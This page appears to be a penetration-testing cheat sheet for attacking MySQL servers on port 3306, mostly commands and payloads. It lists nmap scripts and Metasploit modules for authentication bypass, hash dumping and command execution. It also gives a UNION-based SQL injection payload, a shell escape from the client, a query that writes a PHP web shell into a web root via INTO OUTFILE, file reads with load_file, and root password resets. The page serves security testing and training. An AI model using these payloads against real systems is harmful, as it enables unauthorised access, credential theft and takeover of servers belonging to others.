---
description: >-
  MySQL (Structured Query Language) is a freely available open source Relational
  Database Management System (RDBMS) SQL.
---

# 💵 3306/MYSQL

## Connect

### **Local** <a href="#local" id="local"></a>

```
mysql -u root # Connect to root without password
mysql -u root -p # A password will be asked (check someone)
```

### Remote <a href="#remote" id="remote"></a>

```
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
```

## External Enumeration <a href="#external-enumeration" id="external-enumeration"></a>

Some of the enumeration actions require valid credentials:

```
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>
msf> use auxiliary/scanner/mysql/mysql_version
msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds 
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
```

## **MySQL commands** <a href="#mysql-commands" id="mysql-commands"></a>

```
show databases;
use <database>;
show tables;
describe <table_name>;

select grantee, table_schema, privilege_type FROM schema_privileges; #Exact privileges
select user,file_priv from mysql.user where user='root'; #File privileges
select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Get a shell with the mysql client user
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

#Read & Write
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```

## Checklist

* [ ] Attempt login without password
* [ ] Can be used for checking passwords found from a different service

## Tool:

mysql (Client)
